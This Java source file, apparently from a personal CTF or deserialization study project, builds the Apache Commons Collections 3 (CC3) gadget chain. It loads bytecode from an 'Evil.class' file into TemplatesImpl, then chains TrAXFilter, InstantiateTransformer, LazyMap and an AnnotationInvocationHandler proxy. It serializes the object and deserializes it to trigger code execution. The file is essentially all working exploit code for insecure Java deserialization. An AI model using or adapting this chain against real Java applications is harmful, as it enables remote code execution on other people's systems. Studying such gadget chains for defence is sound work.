package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Field _nameField = TemplatesImpl.class.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesImpl,"aaa");
        Field _bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\tmp\\Evil.class"));
        byte[][] codes={code};
        _bytecodesField.set(templatesImpl,codes);


//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{},new Object[]{templatesImpl});
//        instantiateTransformer.transform();
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class ),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashedMap map=new HashedMap();
        map.put("value","cc1");
        Map<Object,Object> lazyMap= LazyMap.decorate(map,chainedTransformer);
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(c.getClassLoader(),new Class[]{Map.class},invocationHandler);
        InvocationHandler o = (InvocationHandler)constructor.newInstance(Target.class,proxyMap);


        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
        objectInputStream.readObject();
    }
}
